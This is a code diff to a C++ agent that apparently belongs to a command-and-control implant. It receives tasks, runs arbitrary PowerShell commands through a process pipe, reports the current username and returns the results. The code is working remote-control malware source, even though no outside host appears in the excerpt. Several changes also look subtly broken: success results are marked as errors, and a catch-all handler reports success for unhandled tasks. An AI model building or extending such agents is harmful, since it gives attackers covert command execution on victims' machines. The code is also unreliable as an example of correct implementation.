@@ -56,8 +56,11 @@ void Agent::Start()
 
             Response result = std::visit(overloaded{
                 [this](const TaskRequest<CommandPowershell>& psRequest) -> Response {
-                    return ExecutePowerShell(psRequest);
+                    return this->ExecutePowerShell(psRequest.taskID, psRequest.data);
                 },
+                [](const auto& unhandledRequest) -> Response {
+                    return TaskResponse<TaskSuccess>{ };
+                }
             }, request);
 
             taskManager.StoreTaskResult(result);
@@ -74,26 +77,24 @@ void Agent::Exit()
     ExitProcess(0);
 }
 
-std::string Agent::GetUID() {
+Response Agent::GetUID(const int& taskID, const bool& isTrue) {
     char username[256];
     DWORD username_len = sizeof(username);
     // Get the username of the current user
-    if (GetUserNameA(username, &username_len))
-    {
-        return std::string(username);
-    }
+    GetUserNameA(username, &username_len);
 
-    return std::string();
+    return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskSuccess{ username });
 }
 
-Response Agent::ExecutePowerShell(const TaskRequest<CommandPowershell>& psRequest)
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+Response Agent::ExecutePowerShell(const int& taskID, const CommandPowershell& psRequest)
 {
     std::string result;
-    std::string psCommand = "powershell.exe -Command \"" + psRequest.data.commandlet + "\"";
+    std::string psCommand = "powershell.exe -Command \"" + psRequest.commandlet + "\"";
     FILE* pipe = _popen(psCommand.c_str(), "r");
     if (!pipe)
     {
-        return CreateTaskResponse(psRequest.taskID, psRequest.type, 500, 0, TaskError{ 500, "Failed to open process pipe." });
+        return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskError{ 0, "Failed to open process pipe." });
     }
 
     char buffer[128];
@@ -105,7 +106,7 @@ Response Agent::ExecutePowerShell(const TaskRequest<CommandPowershell>& psReques
 
     _pclose(pipe);
 
-    return CreateTaskResponse(psRequest.taskID, psRequest.type, 0, 0, TaskSuccess{ result });
+    return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskSuccess{ result });
 }
 
 
